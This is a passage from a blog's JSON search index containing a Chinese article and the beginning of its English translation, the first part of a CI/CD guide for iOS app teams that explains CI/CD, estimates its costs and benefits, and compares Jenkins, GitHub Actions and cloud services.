process step-by-step using App (iOS) CI/CD as a case study.Series Articles: CI/CD Practical Guide (1): What is CI/CD? How to build a stable and efficient development team through CI/CD? Tool selection? CI/CD Practical Guide (2): Comprehensive use and construction of GitHub Actions and self-hosted Runners CI/CD Practical Guide (3): Implementing CI and CD workflows for App projects using GitHub Actions CI/CD Practical Guide (4): Using Google Apps Script Web App to connect GitHub Actions to build a free and easy-to-use packaging tool platformBuy me a coffee This series of articles has taken a significant amount of time and effort to write. If the content has been helpful to you and has made a tangible improvement in your team’s work efficiency and product quality, feel free to buy me a coffee as a token of appreciation!Buy me a coffeeIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 191 Total Views Last Statistics Date: 2025-08-15 | 180 Views on Medium." }, { "title": "CI/CD 實戰指南（一）：CI/CD 是什麼？如何透過 CI/CD 打造穩定高效的開發團隊？工具選擇？", "url": "/posts/zrealm-dev/ci-cd-%E5%AF%A6%E6%88%B0%E6%8C%87%E5%8D%97-%E4%B8%80-ci-cd-%E6%98%AF%E4%BB%80%E9%BA%BC-%E5%A6%82%E4%BD%95%E9%80%8F%E9%81%8E-ci-cd-%E6%89%93%E9%80%A0%E7%A9%A9%E5%AE%9A%E9%AB%98%E6%95%88%E7%9A%84%E9%96%8B%E7%99%BC%E5%9C%98%E9%9A%8A-%E5%B7%A5%E5%85%B7%E9%81%B8%E6%93%87-c008a9e8ceca/", "categories": "ZRealm Dev.", "tags": "ios-app-development, cicd, github-actions, jenkins, agile", "date": "2025-06-30 15:10:16 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.CI/CD 實戰指南（一）：CI/CD 是什麼？如何透過 CI/CD 打造穩定高效的開發團隊？工具選擇？以 App (iOS) Team 為例，帶您從 0 認識 CI/CD 與導入後能帶來的實質價值。Photo by Leif...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.CI/CD 實戰指南（一）：CI/CD 是什麼？如何透過 CI/CD 打造穩定高效的開發團隊？工具選擇？以 App (iOS) Team 為例，帶您從 0 認識 CI/CD 與導入後能帶來的實質價值。Photo by Leif Christoph Gottwald前言歷經了兩次在不同開發團隊建置 App CI/CD 的經驗，最近終於有時間整理這段從「為什麼要做」到「該怎麼做」的心路歷程；不敢保證是最標準的 CI/CD 工作流程，但絕對是一個值得參考的起點，幫助您的團隊開始導入、提升產品穩定性與整體開發效率。章節本系列文章會從「CI/CD 是什麼、能帶來哪些價值」開始講起，接著開始手把手實作「如何用 GitHub Actions + self-hosted Runner 搭建 CI/CD 環境」並「以 App 開發為例，實際導入 CI 和 CD」，最後還會介紹如何「使用Google Apps Script Web App 結合 GitHub Actions，打造一個方便跨團隊使用的 App 打包平台」希望這系列內容對你有所幫助。 CI/CD 實戰指南（一）：CI/CD 是什麼？如何透過 CI/CD 打造穩定高效的開發團隊？工具選擇？ CI/CD 實戰指南（二）：GitHub Actions 與 self-hosted Runner 使用與建置大全 CI/CD 實戰指南（三）：使用 GitHub Actions 實作 App 專案的 CI 與 CD 工作流程 CI/CD 實戰指南（四）：使用 Google Apps Script Web App 串接 GitHub Actions 建置免費易用的打包工具平台最終成果廢話不多說，先上最終結果。Demo PRDemo Web AppCI/CD — 全部都使用 GitHub Actions 開發，好維護、好擴充。CI: 發 PR 自動觸發單元測試 依照改動檔案範圍執行對應測試 測試通過 (passed) 後才能 Merge PRCD: Google Apps Script Web App (CD 打包介面) 工程師、QA、PM 都可以透過這個網站在電腦或手機上打包 App GitHub Actions Self-hosted Runner 使用自己的機器跑 CI/CD 用量吃到飽 串接 Firebase App Distribution API 直接取得打包的測試版下載連結Automation : 發 PR 自動 Assign self 發 PR 自動隨機指定 Reviewer 標記 PR Size LabelDemo Web App/ProjectSign in Edit description script.google.comCI/CD 是什麼？故事 — 無 CI/CD 的開發流程在談 CI/CD 究竟是什麼之前我們先拋開「CI/CD」這個詞，先來回想一下一個初創什麼工作流程都沒有導入的開發團隊，會是怎麼工作的，大致簡略為下圖流程： 產品有一個 Bug，Developer T 從主分支開分支 fix/bug-c 分支進行修正，修正完後 Merge 回主分支。 緊接著 Developer Z 從主分支開分支 feature/a 做 需求 A，做到一半發現功能怪怪的， 查了一下才發現原來當前功能被改壞、測試也壞了 ，回頭通知 Developer T 進行修正。 一切開發完畢後，Developer Z 使用他的電腦打包版本給 QA 測試，來來回回修正跟打包 ，最後沒問題後將功能回到主分支。 很快地也到了 Sprint 尾聲需要打包釋出給使用者；Developer Z 先放下手上工作 ，協助從主分支打包給 QA 進行 Regression 測試，同樣 來來回回修正問題跟重新打包 ，完成後打包送審 App。 Apple/Google 審核完畢後發布給使用者使用。問題在以上故事中我們可以歸納出兩個大問題。Question 1: 對當前正確的功能異動無任何統一檢查機制。 不符合 Coding Style 的程式碼也能 Merge 就算 Build 不起來我也能 Merge 異動後基本的 Unit Tests、重要檢查項目都沒過也能 Merge 我的環境功能正確但其他人不一定正確 影響到其他正在開發的人Question 2: 耗費大量人力時間在打包工作上。 打包要透過工程師人力打包，中斷當前開發工作 來回在打包與開發之間，心流切換成本極高 打包等待時間無法進行其他開發工作 工程師的時間成本就是金錢 人工操作可能出錯 QA 要請工程師打包 (來回溝通)CI — Continuous Integration 持續整合對應 Question 1「持續整合」旨在確保所有變動都能自動執行統一環境的 Build &amp; Test 確保進入生產環境之前的改動都通過所有測試案例及符合團隊規範 — 「持續地自動確保正確的程式碼整合到生產環境」。另外也可以增加 Nightly Build、更多的自動化測試環節，確保穩定性。CD — Continuous Delivery / Deployment 持續交付/部署對應 Question 2「持續部署」旨在確保程式碼在 CI 環節無異常之後，將改動結果自動完成打包部署繁瑣流程給內部測試(QA, Debug, Staging, Beta…)或外部上線(Production, Release…)。 Continuous Deployment: 全自動直接部署到 Production 環境 Continuous Delivery: 只自動部署到 Staging/Debug 環境可，需手動驗證確認沒問題之後才會再部署到 Production 環境依照 App 開發的場景，比較偏向是 Continuous Delivery 持續交付 ，我們希望 App 最終上線之前是由人工把關確認完全無問題後才發布，確保釋出時間與功能正確性。故事 — 透過 CI/CD 打造穩定高效的開發團隊回頭看我們的故事，導入 CI/CD 後： CI所有人的調整都需要經過 自動化測試驗證通過後才能進入主分支、增加 Nightly Build 定時自動化測試環節提升穩定性。 CD統一都使用 CD 打包，Developer T 和 Developer Z 可以完全專注在業務開發上、減少人工溝通與操作錯誤。 團隊工作效率與產品穩定性 🚀🚀🚀🚀🚀CI/CD 的價值結合敏捷開發的核心理念「小步快跑，快速迭代」CI/CD 為其提供了「頻繁持續迭代功能」時的穩定性與工作效率的基石。自動統一驗證迭代結果 確保所有調整都符合正確的預期結果、不影響其他功能、不影響其他成員自動執行繁瑣的部署流程 讓團隊成員可以專注在主要業務開發、減少人工操作錯誤CI/CD 的成效回顧 2021 年在 Pinkoi 的演講「 2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密 」其實說來說去都是差不多的內容，不外乎就是「自動化、減少人跟人的依賴、專注在主要業務上」導入 CI/CD 也完全符合上述三個方向，藉此我們也可以用同樣的方法來估算成效。另外有一點需要再次 Highlight 的是 心流切換成本 ：當我們持續投入工作一段時間後就會進入「心流」狀態，此時的思緒、生產力都達到巔峰，能提供做好最有效的產出；但如果被打斷，要重新回到心流，又會再需要一段時間，這邊以 30 分鐘為例。在無 CI/CD 的場景中可能是： 花很多時間才發現是被改壞再回頭溝通調整(CI)、QA/PM 來請工程師幫忙打包測試版 App (CD)。CI/CD 成效估算團隊人數 6 人 / 一個月來計算這邊我們以每個月為基準，假設在無 CI/CD 流程時，每個月會發生 4 次意外改壞主分支的問題，造成後續修正、溝通的成本，約花費 720 分鐘；加上每個月打包測試版、正式版及因人工操作造成錯誤的可能，總和約 1,010 分鐘；以工程師月薪 8 萬計算，每個月就造成約 1 萬 3 的成本浪費。CI/CD 建置成本 人力成本：照本系列文章建置，粗估需投入人力 1 人花費 10 天 = 4,800 分鐘 能完成。(~= NT$36,384 ) 設備與執行成本：使用 GitHub Actions self-hosted Runner 只需在前期採購 1–2 台 Mac-Mini 或直接使用現有汰換的 MacBook Pro 就能當成 CI/CD Runner 提供服務使用。以 6 人團隊採購一台全新的 Mac Mini 為例：32G RAM M4 Mini (= NT$40,900 )總花費成本約 NT$80,000 元就能完成建置，約半年後開始享受效益。 聲明： 這裡只是提出一種效益計算的方式，不一定是最準確的；只是給大家一個概念去延伸， 讓管理決策層能看到 CI/CD 的效益 進而授權推動完成整個工作流程。CI/CD 的工具選擇雲服務 Bitrise / XCode Cloud Bitrise： 最早期主打提供 App CI/CD 的雲服務，第一次接觸 CI/CD 也是使用 Bitrise，它提供友善直覺的步驟編輯工具，可以很快的設定好 App CI/CD 流程。缺點： 最早期是 $99 鎂吃到飽，Apple M 系列處理器剛出來的時候一度改成用量計費( 養套殺 )，那時候估團隊用量每個月至少要花 $500 鎂，索性就遷移至 GitHub Actions 了。但最近看官網，現在有提供 1 App / 1 Concurrent / 吃到飽 / $89 鎂 / 月。 XCode Cloud： 100 小時 / 1 個月 / $50 鎂，優點是與 XCode、App 開發高度整合；但缺點同樣是，無法提供 Android 使用、要客製化一些步驟會有些困難；但如果是純 iOS 的小型 App 我會再次考慮直接使用。 實在很怕 雲服務又養套殺 、希望可控性在自己手上，所以改考慮地端服務。地端服務 Jenkins / GitHub Actions / Gitlab CI/CD Gitlab CI/CD： 比 GitHub Actions 推出的時間更早、功能更完整，但是我們的專案是託管在 GitHub 上所以就不考慮用 Gitlab CI/CD 了；但是兩邊功能類似，本系列文章會以使用 GitHub Actions 為例。 GitHub Actions GitHub 2018 年才推出的 CI/CD 服務，跟 GitHub 專案直接綁定，在這幾年持續更新完善功能，有很多封裝好的步驟 ( Marketplace ) 可以直接使用；支援 self-hosted runner 可以使用自己的機器無限使用。(等於混合雲了) Jenkins： 一個專門處理 CI/CD 的開源免費工具、古老但是功能強大；從應用層任務設計、權限管理到底層服務派發執行，Jenkins 全包；同樣有 Plugins 可以直接搭配使用，是早期 DevOps CI/CD 的必備工具。Jenkins v.s. GitHub ActionsTL;DR 在沒有專門做 DevOps 的 App Team，要 App 開發者從 0 到 1 架設維護 Jenkins 環境門檻太高、會的人也不多還會衍生出網路安全問題；選擇直接用 GitHub Actions，App 開發者只需專注在 CI/CD 流程設計，大概掃一下官方文件怎麼撰寫跟啟動 Runner，就能快速搭建出免費穩定又安全的 CI/CD 服務。 以下僅以 App CI/CD 架設為出發點做比較，並不適用所有技術場景。架設與維護難易度 Jenkins &gt;&gt;&gt; GitHub Actions這邊先用一張不是很專業的結構分層圖來說明兩者的差異，Jenkins 如前述是從上到下功能全包，所以在自架上會複雜許多；而 GitHub Actions，GitHub Actions 本身只需要在 GitHub 上撰寫 YAML 工作流程，本地機器只需要註冊好 GitHub self-hosted Runner (5 個指令就完成)，GitHub 就會自動派發任務給本地機器執行了，其他包涵 Github Actions/Runner 版本升級或是任務派發問題都是 GitHub 負責維護，我們無需處理。還有另一個比較麻煩的點是 Jenkins 是獨立於 Git 的服務，之間要透過 API (e.g. GitHub API/WebHook) 進行溝通，設定又更複雜了。之前也從身邊能接觸到的 iOS 開發者(約 30 位)做過調查，懂 Jenkins 的屈指可數( 2 位) 而有在使用 GitHub Actions 的則超過 (10 位) 畢竟就是寫一寫 YAML 就能完成 CI/CD 任務。學習難易度 Jenkins »&gt; GitHub Actions同上只需參考官方文件學習 GitHub Actions 可用 YAML 指令跟如何在本地起自己的 Runner 即可。穩定性 GitHub Actions &gt; Jenkins這點我覺得 GitHub Actions 略勝 Jenkins。Jeknins 有機會因為系統升級或裝到有衝突的 Plugin 導致服務崩潰 (不過如果跑得好好的不去動它基本上沒有問題)。GitHub Actions 受限於 GitHub 服務狀態 (如果 GitHub 掛也會跟著掛)，但是發生頻率不高，平均在線率都能維持在 99.9%；真出問題也不用處理，坐等修復。安全性 GitHub Actions &gt; Jenkins考量到 GitHub Actions/Runner 服務本身是 GitHub 在維護跟自動更新這點可能會比 Jenkins 需要手動更新來的更安全。另外 Jenkins 跟 GitHub 溝通之間需要開 API/WebHook 口相對比較危險，GitHub 與 GitHub Actions 之間是無痛整合、GitHub Actions 與 self-hosted Runner 之間是觀察者模式，self-hosted Runner 會去跟 GitHub 要任務回來做，所以 Runner 本身不需開對外接口。但如果是全封閉網路環境，Jenkins 會比 GitHub Actions 安全。權限控管 Jenkins »&gt; GitHub Actions這點需要特別挑出來比較，Jenkins 可以另外設定帳號登入權限進行控管；GitHub Actions 則直接與 GitHub Repo 進行綁定，要有 Repo 權限的人才能使用。 *因此後面的文章才會又用 GAS Web App 搭建跨團隊的操作平台。使用廣度 Jenkins »&gt; GitHub Actions在有完整 DevOps Team 的團隊無庸置疑的應該還是會選擇 Jenkins，畢竟在其他領域 (例如 Web, 後端, Java…) 還是 Jenkins 運行最久、Plugin 做多最好用，並且可以統一建置一套 CI/CD 服務所有團隊使用方便控管，或是後端部署完前端自動部署這種複雜的 CI/CD 場景。 *GitHub Actions 後來也支援跨 Repo Actions/Runner 了。第三方套件豐富度 Jenkins &gt; GitHub Actions就數量上 GitHub Actions 大於 Jenkins，但是 Jenkins 理的 CI/CD 功能比較有深度跟強大，GitHub Actions 很多只是自動化的功能。功能深度 Jenkins »&gt; GitHub Actions這點沒法比，Jenkins 已做了快 20 年，GitHub Actions 還有很多功能需要再補上；例如：權限管理、Secret 管理(目前只限純文字，密鑰檔案的話要先轉成純文字)、Cache/Artifact 目前只支援 Cloud…等等擴展上，GitHub Self-hosted Runner 也支援 Docker or k8s 。客製化深度 Jenkins »&gt; GitHub ActionsJenkins 從頭到尾都掌控在自己手上，客製化的權限比較大，可以影響到整個系統，GitHub Actions 只能在應用層客製化不同步驟而已。例如目前 GitHub Actions 內建的 Artifacts 不支援 self-hosted，那也只能在步驟中改成 sh copy 到其他目錄，無法自行客製化實現 Artifacts。 *App CI/CD 場景也用不到太深度的功能。易用性 GitHub Actions »&gt; Jenkins介面上 GitHub Actions 是新的工具在介面使用上比 Jenkins 更容易使用； 腳本設定上 Jenkins 是 Pipeline Script 儲存在 Jenkins 上、GitHub Actions 是 YAML 檔跟著專案 Git 管理，也比 Jenkins 容易設定。費用風險 Jenkins &gt; GitHub ActionsJenkins 全開源免費權掌握在手，GitHub Actions 部分開源但任務派發與執行是 GitHub 封閉的 SAAS 服務；目前政策是 GitHub Actions 完全免費，使用 GitHub Runner 才要錢(Private Repo)，使用 self-hosted runner 則不用。Google Apps Script Web App 的用途與為何選擇另一個工具選擇是 Google Apps Script Web App，會需要多一個這個的原因是 GitHub Actions 自帶的表單功能過於陽春(介面太工程、只能靜態)並且執行權限跟 GitHub Repo 綁定在一起，如果我們需要提供給其他職能夥伴使用會非常的麻煩。如下：CD 打包會希望讓操作人填寫一些資訊，例如 Release Notes。因此我們需要一個「介面」工具提供給其他夥伴使用或甚至是自己工程師更方便的使用。所需情境： 在這個比較好用的「介面」上填寫需要的資訊，串接專案管理工具(e.g. Jira, Asana) 取得 Task 或是 GitHub 直接取得 PR 列表，直接下拉選單選擇後送出，再透過 GitHub API 觸發 GitHub Actions 進行打包。Slack第一次導入 CI/CD 的時候我們選擇串接 Slack API 達成類似如下效果：https://slack.com/intl/zh-tw/blog/productivity/workflow-builder-tools-automation-examples 夥伴可以直接在 Slack 中使用表單填寫資訊、並觸發 CD 打包、收到 Slack 通知使用操作起來很順暢並且統一在日常的辦公工具上(SSOT) 不需重新學習；但是他背後的問題是 開發跟維護成本非常的高 ，其中有一個原因是 Slack Outgoing-Webhook API 對響應要求非常高 (需要在 3 秒內)，因此基本上可以直接排除使用 FAAS 服務簡單串接了 (e.g. Cloud Functions, GAS, Lambda…)。之前的做法是有一位對自動化跟後端很有興趣的夥伴自己用 Kotlin+ktor 開發了一整套後端服務，然後再 GCP 起伺服器供 Slack 串接使用。 開發與維護成本非常非常高而且很難交接。Google Apps Script — Web App之前有分享過「 使用 Google Apps Script Web App 表單串接 Github Action CI/CD 工作 」:Demo Web App Form URL使用 Google Apps Script — Web App 的優勢是： 網站 Web 同 Google Workspace 企業帳號權限管理，可設定只有組織內的 Google 帳號才能存取 完全免費 Function as a Service 不需自行架設維護伺服器 較容易維護與交接 手機上可以操作 AI Can Help! 不管是 ChatGPT 或其他 AI 工具對 GAS 都非常熟悉，可以直接動口請他幫我們製作打包表單與串接 GitHub API 一樣能串接 Jira,Asana,Slack 通知 API第二推廣我就改用 GAS Web App 給夥伴使用，同樣得到很好的反響，跟 Slack 差別就只在要多記一個網址到書籤，需要打包的時候打開網址從網頁表單操作打包。App CI/CD 完整工具流程這邊先附上完整的工作流程，下篇開始會逐步介紹每個工具如何使用與串接。工具角色： GitHub Actions : CI/CD 邏輯腳本程式碼 GitHub Actions — Self-hosted Runner : CI/CD 實際執行的地方，使用自己架設的 Runner 執行，只需要負擔機器購買成本，就能無限制使用量的執行任務。 Google Apps Script Web App : 因打包不一定是工程師負責，需要有一個平台給跨職能夥伴可以使用； GAS Web App 能快速打造一個 Web 工具分享網址給其他人操作使用。 Asana/Jira : 專案管理工具，可與 GAS Web App 串接讓 QA/PM 可以直接選擇想把包的 Task 進行打包。 Slack : 負責接收執行結果通知場景： End-User (QA/PM/PD/Developer): 使用 GAS Web App 送出打包表單 (撈取 Jira or Asana 任務單對應的 Branch) -&gt; GAS 打 GitHub API -&gt; 觸發 CD 打包 Github Actions &lt;- GitHub self-hosted runner 監聽到任務拉回機器執行 -&gt; 執行完畢 Slack 通知、更新 GAS Web App 打包狀態。 End-User (Developer): 開 PR、Push new commit 到 PR -&gt; 觸發 CI 測試流程 &lt;- GitHub self-hosted runner 監聽到任務拉回機器執行 -&gt; 執行完畢 Comment 測試結果、更新 Checks。總結本篇主要是帶大家初步了解 CI/CD 是什麼跟帶來的效益，下一篇開始會進入技術環節，手把手帶您了解、實作 GitHub Actions CI/CD 到最終完成前文的最終成果。系列文章： CI/CD 實戰指南（一）：CI/CD 是什麼？如何透過 CI/CD 打造穩定高效的開發團隊？工具選擇？ CI/CD 實戰指南（二）：GitHub Actions 與 self-hosted Runner 使用與建置大全 CI/CD 實戰指南（三）：使用 GitHub Actions 實作 App 專案的 CI 與 CD 工作流程 CI/CD 實戰指南（四）：使用 Google Apps Script Web App 串接 GitHub Actions 建置免費易用的打包工具平台Buy me a coffee 本系列文章花費了大量的時間精力撰寫，如果內容對您有幫助、對您的團隊有實質提升工作效率與產品品質；歡迎請我喝杯咖啡，感謝支持！Buy me a coffee有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 637 Total Views Last Statistics Date: 2025-08-15 | 612 Views on Medium." }, { "title": "CI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Efficient Development Team through CI/CD? Tool Selection?", "url": "/posts/zrealm-dev/en/ci-cd-practical-guide-part-1-what-is-ci-cd-how-to-build-a-stable-and-efficient-development-team-through-ci-cd-tool-selection-c008a9e8ceca/", "categories": "ZRealm Dev.", "tags": "ios-app-development, cicd, github-actions, jenkins, agile", "date": "2025-06-30 15:10:16 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版CI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Efficient D...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版CI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Efficient Development Team through CI/CD? Tool Selection?Using the App (iOS) Team as an example, this guide will help you understand CI/CD from scratch and the tangible value it can bring after implementation.Photo by Leif Christoph GottwaldIntroductionAfter going through the experience of setting up App CI/CD in two different development teams, I finally found time to organize my thoughts from “why do it” to “how to do it.” I can’t guarantee that this is the most standard CI/CD workflow, but it is definitely a valuable starting point to help your team begin implementation, improve product stability, and enhance overall development efficiency.ChaptersThis series of articles will start with “What is CI/CD and what value does it bring?” Then, we will walk through the hands-on implementation of “How to set up a CI/CD environment using GitHub Actions + self-hosted Runner” and “Implementing CI and CD using App development as an example.” Finally, we will introduce how to “Use Google Apps Script Web App in conjunction with GitHub Actions to create a convenient app packaging platform for cross-team use.” I hope this series will be helpful to you. CI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Efficient Development Team through CI/CD? Tool Selection? CI/CD Practical Guide (Part 2): Comprehensive Guide to Using and Setting Up GitHub Actions and Self-hosted Runner CI/CD Practical Guide (Part 3): Implementing CI and CD Workflows for App Projects Using GitHub Actions CI/CD Practical Guide (Part 4): Building a Free and Easy-to-Use Packaging Tool Platform Using Google Apps Script Web App and GitHub ActionsFinal ResultsWithout further ado, here are the final results.Demo PRDemo Web AppCI/CD — All developed using GitHub Actions, easy to maintain and extend.CI: Automatically trigger unit tests upon PR submission Execute corresponding tests based on the scope of changed files Only merge PR after tests passCD: Google Apps Script Web App (CD packaging interface) allows engineers, QA, and PMs to package the app via this website on computers or mobile devices GitHub Actions Self-hosted Runner uses your own machine for unlimited CI/CD usage Integrate with Firebase App Distribution API to directly obtain download links for packaged test versionsAutomation: Automatically assign self upon PR submission Randomly assign a reviewer upon PR submission Tag PR with size labelsDemo Web App/ProjectSign in Edit description script.google.comWhat is CI/CD?Story — Development Process Without CI/CDBefore discussing what CI/CD is, let’s set aside the term “CI/CD” and recall how a startup development team without any established workflow would operate. The process can be roughly summarized in the following diagram: A product has a bug, Developer T creates a branch fix/bug-c from the main branch to fix it, and after completing the fix, merges it back to the main branch. Immediately after, Developer Z creates a branch feature/a from the main branch for Requirement A, but halfway through realizes something is off with the feature. Upon checking, they discover that the current functionality has been broken and the tests are also failing, so they notify Developer T to make the fix. Once all development is complete, Developer Z packages the version for QA testing using their computer, going back and forth to fix and package until everything is fine, and then merges the feature back to the main branch. As the sprint comes to an end, they need to package for release to users; Developer Z puts aside their current work to assist in packaging from the main branch for QA to conduct regression testing, similarly going back and forth to fix issues and repackage until it is completed and submitted for app review. After Apple/Google reviews, it is released to users.ProblemsFrom the above story, we can identify two major issues.Question 1: There is no unified checking mechanism for current functional changes. Code that does not conform to coding style can still be merged Even if the build fails, I can still merge Changes can be merged even if basic unit tests and important checks have not passed My environment may work correctly, but others may not This affects others who are currently developingQuestion 2: A significant amount of manpower is wasted on packaging work. Packaging requires engineer manpower, interrupting current development work The cost of switching between packaging and development is extremely high Waiting time for packaging prevents other development work from proceeding The time cost of engineers translates to money Manual operations may lead to errors QA needs to ask engineers to package (back and forth communication)CI — Continuous IntegrationIn response to Question 1, “Continuous Integration” aims to ensure that all changes automatically undergo a unified environment’s build and test to ensure that modifications pass all test cases and comply with team standards before entering the production environment — “continuously and automatically ensuring correct code integration into the production environment.”Additionally, it can include nightly builds and more automated testing phases to ensure stability.CD — Continuous Delivery / DeploymentIn response to Question 2, “Continuous Deployment” aims to ensure that after the CI phase has no issues, the results of changes are automatically packaged and deployed through tedious processes for internal testing (QA, Debug, Staging, Beta…) or external release (Production, Release…). Continuous Deployment: Fully automated deployment directly to the Production environment Continuous Delivery: Automatically deploys to Staging/Debug environments, requiring manual verification before deploying to the Production environmentIn the context of app development, it leans more towards Continuous Delivery, as we want to ensure that the app is fully verified and confirmed to be error-free by humans before release, ensuring the accuracy of release timing and functionality.Story — Building a Stable and Efficient Development Team through CI/CDLooking back at our story, after implementing CI/CD: CIAll adjustments must pass automated testing verification before entering the main branch, and nightly builds are added to enhance stability. CDEveryone uses CD for packaging, allowing Developer T and Developer Z to fully focus on business development, reducing manual communication and operational errors. Team work efficiency and product stability 🚀🚀🚀🚀🚀The Value of CI/CDCombining the core concept of agile development “small steps, quick iterations,” CI/CD provides the foundation for stability and work efficiency during “frequent continuous feature iterations.”Automated Unified Verification of Iteration Results Ensures all adjustments meet the correct expected results, do not affect other functionalities, and do not impact other team membersAutomated Execution of Tedious Deployment Processes Allows team members to focus on primary business development, reducing manual operational errorsThe Effectiveness of CI/CDReflecting on the 2021 talk at Pinkoi, “2021 Pinkoi Tech Career Talk — Secrets of High-Efficiency Engineering Teams,” the content essentially revolves around “automation, reducing reliance on individuals, and focusing on primary business.” Implementing CI/CD aligns perfectly with these three directions, allowing us to estimate effectiveness using the same methods.Another point that needs to be highlighted is the cost of switching tasks:When we continuously engage in work for a period, we enter a “flow” state, where our thoughts and productivity peak, enabling us to produce the most effective output. However, if interrupted, it takes time to return to that flow, which can be estimated at around 30 minutes.In a scenario without CI/CD, it might look like this: Spending a lot of time only to discover that something was broken and then going back to communicate adjustments (CI), and asking engineers to help package the test version of the app (CD).Estimating CI/CD EffectivenessTeam size of 6 people / Monthly calculationHere, we use a monthly basis, assuming that without CI/CD processes, there would be 4 instances of accidentally breaking the main branch each month, leading to subsequent correction and communication costs, totaling about 720 minutes; plus the time spent packaging test versions, official versions, and the potential errors caused by manual operations, summing up to approximately 1,010 minutes; with an engineer’s monthly salary of 80,000, this results in about 13,000 in wasted costs each month.CI/CD Implementation Costs Labor Costs:Based on the construction outlined in this series of articles, it is estimated that 1 person would need to invest 10 days = 4,800 minutes to complete it. (~= NT$36,384 ) Equipment and Execution Costs:Using GitHub Actions self-hosted Runner only requires the procurement of 1–2 Mac Mini or directly using existing replaced MacBook Pro to serve as CI/CD Runner.Taking the example of purchasing a brand new Mac Mini for a 6-person team: 32G RAM M4 Mini (= NT$40,900 )The total cost is approximately NT$80,000, allowing for completion of the setup, with benefits starting to be enjoyed after about six months. Disclaimer: This is merely a proposed method for calculating benefits and may not be the most accurate; it is intended to provide a concept for extending, allowing management decision-makers to see the benefits of CI/CD and subsequently authorize the promotion of the entire workflow.Tool Selection for CI/CDCloud Services Bitrise / XCode Cloud Bitrise: The earliest cloud service focused on providing App CI/CD. My first encounter with CI/CD was also through Bitrise, which offers a user-friendly step editing tool that allows for quick setup of App CI/CD processes.Cons: Initially, it was $99 for unlimited usage, and when the Apple M series processors were first released, they switched to usage-based billing ( a trap ). At that time, it was estimated that the team’s usage would cost at least $500 per month, so we migrated to GitHub Actions.However, I recently checked their website, and they now offer 1 App / 1 Concurrent / unlimited usage for $89 per month. XCode Cloud: 100 hours / 1 month / $50, with the advantage of being highly integrated with XCode and app development; however, it also has the drawback of not supporting Android and some custom steps may be difficult; but if it’s a small pure iOS app, I would reconsider using it directly. I am really afraid of cloud services being a trap, and I hope to have control in my hands, so I am considering on-premises services.On-Premises Services Jenkins / GitHub Actions / Gitlab CI/CD Gitlab CI/CD: Launched earlier than GitHub Actions and has more complete features, but since our project is hosted on GitHub, we won’t consider using Gitlab CI/CD; however, the functionalities are similar, and this series of articles will use GitHub Actions as an example. GitHub Actions Launched by GitHub in 2018, this CI/CD service is directly tied to GitHub projects and has continuously updated and improved features over the years, with many pre-packaged steps available in the ( Marketplace ) for direct use; it supports self-hosted runners that allow unlimited use of your own machines. ( essentially a hybrid cloud ) Jenkins: An open-source free tool specifically for handling CI/CD, it is old but powerful; from application layer task design, permission management to underlying service dispatch execution, Jenkins covers it all; it also has Plugins that can be used directly, making it an essential tool for early DevOps CI/CD.Jenkins vs. GitHub ActionsTL;DR For an App Team without dedicated DevOps, having app developers set up and maintain a Jenkins environment from scratch is too high a barrier, and there are not many who know how to do it, which can also lead to network security issues; it is better to choose GitHub Actions directly, allowing app developers to focus solely on designing the CI/CD process, and with a quick review of the official documentation on how to write and start the Runner, they can quickly set up a free, stable, and secure CI/CD service. The following comparison is based solely on setting up App CI/CD and does not apply to all technical scenarios.Ease of Setup and Maintenance Jenkins »&gt; GitHub ActionsHere’s a not-so-professional structural diagram to illustrate the differences between the two. As mentioned earlier, Jenkins encompasses all functionalities from top to bottom, making self-hosting much more complex. In contrast, GitHub Actions only requires you to write a YAML workflow on GitHub; your local machine just needs to register a GitHub self-hosted Runner (which can be done in 5 commands), and GitHub will automatically dispatch tasks to your local machine for execution. Other aspects, such as GitHub Actions/Runner version upgrades or task dispatch issues, are maintained by GitHub, so we don’t need to handle them.Another point of complexity is that Jenkins operates independently of Git, requiring communication through APIs (e.g., GitHub API/WebHook), which adds to the setup complexity.I previously conducted a survey among about 30 iOS developers I know, and only a handful (2) understood Jenkins, while over 10 were using GitHub Actions, as it simply involves writing YAML to complete CI/CD tasks.Learning Difficulty Jenkins »&gt; GitHub ActionsSimilarly, you only need to refer to the official documentation to learn GitHub Actions, including the YAML commands and how to set up your own Runner locally.Stability GitHub Actions &gt; JenkinsIn this regard, I believe GitHub Actions slightly outperforms Jenkins.Jenkins can potentially crash due to system upgrades or conflicts with installed plugins (though if it’s running smoothly and you don’t touch it, there shouldn’t be any issues).GitHub Actions is limited by the GitHub service status (if GitHub is down, it will also be down), but this occurs infrequently, maintaining an average uptime of 99.9%. If issues do arise, there’s no need for us to handle them; we can just wait for a fix.Security GitHub Actions &gt; JenkinsConsidering that the GitHub Actions/Runner service is maintained and automatically updated by GitHub, it may be more secure than Jenkins, which requires manual updates.Additionally, Jenkins requires opening API/WebHook ports for communication with GitHub, which is relatively risky. In contrast, GitHub integrates seamlessly with GitHub Actions, and the communication between GitHub Actions and self-hosted Runners follows an observer pattern, where the self-hosted Runner requests tasks from GitHub, meaning it doesn’t need to open external interfaces.However, in a fully closed network environment, Jenkins may be more secure than GitHub Actions.Permission Control Jenkins »&gt; GitHub ActionsThis point needs to be highlighted for comparison. Jenkins allows for separate account login permissions for control, while GitHub Actions is directly tied to the GitHub Repo, meaning only those with Repo permissions can use it. *This is why the following articles will use GAS Web App to build a cross-team operational platform.Usage Scope Jenkins »&gt; GitHub ActionsIn a complete DevOps team, it’s undeniable that Jenkins would still be the preferred choice, as it has been running the longest 